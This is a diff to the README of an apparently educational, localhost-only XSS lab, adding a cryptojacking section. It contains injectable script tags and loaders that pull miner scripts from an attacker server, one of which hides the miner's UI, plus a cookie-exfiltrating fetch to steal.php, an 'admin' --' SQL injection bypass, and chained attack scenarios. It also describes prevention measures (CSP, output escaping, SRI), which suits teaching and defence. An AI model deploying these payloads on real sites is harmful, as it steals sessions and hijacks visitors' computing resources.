@@ -27,6 +27,7 @@ A educational security lab demonstrating Cross-Site Scripting (XSS) and authenti
 4. Access the applications:
    - Vulnerable App: http://localhost:8080
    - Attacker's Log: http://localhost:8081/logs.php
+   - Mining Statistics: http://localhost:8081/mining_logs.php
 
 ## Vulnerabilities Demonstrated
 
@@ -73,7 +74,65 @@ setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
    document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/";
    ```
 
-### 3. Session Hijacking Steps
+### 3. Cryptojacking Attack
+
+The application is also vulnerable to cryptojacking attacks, where attackers can inject cryptocurrency mining scripts that run in victims' browsers.
+
+1. Create an account and log in
+2. Post a comment with one of these cryptojacking payloads:
+
+   a) Basic Cryptojacking (visible to user):
+   ```html
+   <script src="http://localhost:8081/miner.js"></script>
+   ```
+
+   b) Hidden Cryptojacking (no UI):
+   ```html
+   <script>
+   const script = document.createElement('script');
+   script.src = 'http://localhost:8081/miner.js';
+   script.onload = function() {
+       miner.createUI = function() { /* Do nothing */ };
+       miner.start();
+   };
+   document.head.appendChild(script);
+   </script>
+   ```
+
+   c) Stealth Cryptojacking (completely hidden):
+   ```html
+   <script src="http://localhost:8081/stealth_miner.js"></script>
+   ```
+
+3. When other users view the page, the mining script will:
+   - Silently consume CPU resources to mine cryptocurrency
+   - Report mining statistics back to the attacker
+   - Identify unique victims using browser fingerprinting
+   - Adapt mining intensity based on user activity to avoid detection
+
+4. View mining statistics at http://localhost:8081/mining_logs.php, which shows:
+   - Total hashes mined across all victims
+   - Number of active miners
+   - Unique victims and their details
+   - Mining activity logs
+   - Pages where mining occurred
+
+5. Impact of cryptojacking:
+   - Increased CPU usage and battery drain
+   - System slowdown
+   - Potential overheating
+   - Financial gain for attackers at victims' expense
+
+6. Prevention:
+   ```php
+   // Sanitize user input
+   echo "<p>" . htmlspecialchars($row['content']) . "</p>";
+   
+   // Implement Content Security Policy
+   header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+   ```
+
+### 4. Session Hijacking Steps
 
 1. Steal user's cookie using XSS
 2. Copy the user_session value
@@ -134,11 +193,22 @@ setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
 2. Bypasses authentication
 3. Posts malicious content as admin
 
-### Scenario 3: Combined Attack
+### Scenario 3: Cryptojacking
+1. Attacker creates account
+2. Posts stealth cryptojacking payload in comment
+3. Multiple victims view the page
+4. Mining script runs silently in victims' browsers
+5. Script identifies unique victims using browser fingerprinting
+6. Script adapts mining intensity to avoid detection
+7. Attacker monitors mining statistics in real-time
+8. Victims experience performance degradation without knowing why
+
+### Scenario 4: Combined Attack
 1. Use SQL injection to create admin account
 2. Post XSS payload as admin
 3. Steal cookies from all users
-4. Impersonate multiple users
+4. Deploy cryptojacking scripts to all visitors
+5. Impersonate multiple users while mining cryptocurrency
 
 ## Prevention Measures
 
@@ -164,7 +234,18 @@ setcookie('user_session', $value, [
 $content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
 ```
 
-4. Password Hashing:
+4. Cryptojacking Prevention:
+```php
+// Content Security Policy
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+
+// Subresource Integrity for external scripts
+echo '<script src="https://example.com/script.js" 
+      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" 
+      crossorigin="anonymous"></script>';
+```
+
+5. Password Hashing:
 ```php
 $hashed_password = password_hash($password, PASSWORD_DEFAULT);
 ```
@@ -185,6 +266,13 @@ $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    - Ensure both applications are accessible
    - Check browser console for errors
    - Verify attacker server permissions
+
+4. **Cryptojacking Not Working**
+   - Check browser console for script loading errors
+   - Verify network connectivity between containers
+   - Check if Content Security Policy is blocking scripts
+   - Make sure the URLs are correct (http://localhost:8081/miner.js)
+   - Try using the stealth_miner.js for more reliable operation
 
 ## Legal Disclaimer
 
@@ -262,6 +350,23 @@ fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.co
 
 3. Steal cookies from other users
 4. Use stolen cookies to impersonate users
+
+### 4. Cryptojacking + SQL Injection Chain
+Combine cryptojacking with SQL injection:
+
+1. Use SQL injection to gain admin access:
+```sql
+Username: admin' --
+Password: anything
+```
+
+2. Post cryptojacking payload as admin:
+```html
+<script src="http://localhost:8081/stealth_miner.js"></script>
+```
+
+3. All users visiting the site will mine cryptocurrency for the attacker
+4. Monitor mining statistics at http://localhost:8081/mining_logs.php
 
 ### Prevention
 To prevent SQL injection:
@@ -402,4 +507,11 @@ Remember to always use `docker-compose down -v` when:
 - Changing database schema
 - Resetting the application state
 - Having persistent issues
-- Testing from scratch 
+- Testing from scratch
+
+## Additional Resources
+
+For more detailed information about the cryptojacking vulnerability:
+- See the [CRYPTOJACKING.md](CRYPTOJACKING.md) file
+- Explore sample attack payloads in [attack-others/cryptojacking-payload.txt](attack-others/cryptojacking-payload.txt)
+- Check out the stealth miner implementation in [attacker-server/src/stealth_miner.js](attacker-server/src/stealth_miner.js) 
